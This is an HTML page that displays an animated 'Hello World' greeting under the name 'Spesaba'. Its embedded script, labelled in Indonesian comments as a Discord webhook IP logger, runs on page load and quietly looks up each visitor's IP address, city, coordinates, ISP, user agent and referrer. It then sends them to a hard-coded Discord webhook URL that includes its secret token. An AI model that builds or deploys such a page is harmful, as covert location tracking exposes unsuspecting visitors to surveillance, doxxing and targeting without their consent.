<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spesaba</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: #0a0a0a;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            overflow: hidden;
        }

        /* Animated gradient text */
        .gradient-text {
            font-size: clamp(3rem, 10vw, 8rem);
            font-weight: 900;
            letter-spacing: -0.05em;
            background: linear-gradient(
                90deg,
                #000000 0%,
                #ffffff 25%,
                #000000 50%,
                #ffffff 75%,
                #000000 100%
            );
            background-size: 200% auto;
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s linear infinite;
            text-align: center;
            line-height: 1;
        }

        @keyframes shimmer {
            0% { background-position: 200% center; }
            100% { background-position: -200% center; }
        }

        /* Symbol 81 */
        .symbol {
            margin-top: 30px;
            font-size: clamp(2rem, 5vw, 4rem);
            font-weight: 300;
            color: #333;
            letter-spacing: 0.3em;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        /* Spesaba text */
        .brand {
            margin-top: 15px;
            font-size: clamp(0.8rem, 2vw, 1.2rem);
            font-weight: 400;
            color: #444;
            letter-spacing: 0.5em;
            text-transform: uppercase;
        }

        /* Subtle glow effect */
        .glow {
            position: absolute;
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-30px) scale(1.1); }
        }

        /* Loading indicator (hidden after data sent) */
        .loading {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            opacity: 0;
            transition: opacity 0.5s;
        }

        .loading.active {
            opacity: 1;
            animation: blink 1s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="glow"></div>

    <h1 class="gradient-text">Hello World</h1>
    <div class="symbol">81</div>
    <div class="brand">Spesaba</div>

    <div class="loading" id="status"></div>

    <script>
        // ===== DISCORD WEBHOOK IP LOGGER =====
        // GANTI WEBHOOK URL DI BAWAH INI
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB";

        async function sendToDiscord(data) {
            if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD")) {
                console.log("[DEV] Webhook belum di-set. Data:", data);
                return;
            }

            const embed = {
                title: "🌐 New Visitor Logged",
                color: 0x5865F2,
                timestamp: new Date().toISOString(),
                fields: [
                    {
                        name: "📍 IP Address",
                        value: "```" + (data.ip || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: "```" + (data.country_name || "Unknown") + " (" + (data.country_code || "") + ")```",
                        inline: true
                    },
                    {
                        name: "🏙️ City",
                        value: "```" + (data.city || "Unknown") + ", " + (data.region || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "📡 ISP / Organization",
                        value: "```" + (data.org || data.asn || "Unknown") + "```",
                        inline: false
                    },
                    {
                        name: "🎯 Coordinates",
                        value: "```" + (data.latitude ? data.latitude + ", " + data.longitude : "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "⏰ Timezone",
                        value: "```" + (data.timezone || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "💻 User Agent",
                        value: "```" + navigator.userAgent.substring(0, 100) + "```",
                        inline: false
                    },
                    {
                        name: "🔗 Referrer",
                        value: "```" + (document.referrer || "Direct") + "```",
                        inline: false
                    }
                ],
                footer: {
                    text: "Spesaba Logger | " + new Date().toLocaleString()
                }
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [embed] })
                });
            } catch (e) {
                console.error("Webhook failed:", e);
            }
        }

        // Fetch IP and geolocation, then send to Discord
        async function logVisitor() {
            document.getElementById("status").classList.add("active");

            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                await sendToDiscord(data);
            } catch (e) {
                // Fallback: send basic info without geolocation
                await sendToDiscord({
                    ip: "Could not fetch",
                    country_name: "Unknown",
                    city: "Unknown",
                    org: "Unknown"
                });
            }

            document.getElementById("status").classList.remove("active");
        }

        // Run on page load
        logVisitor();
    </script>
</body>
</html>
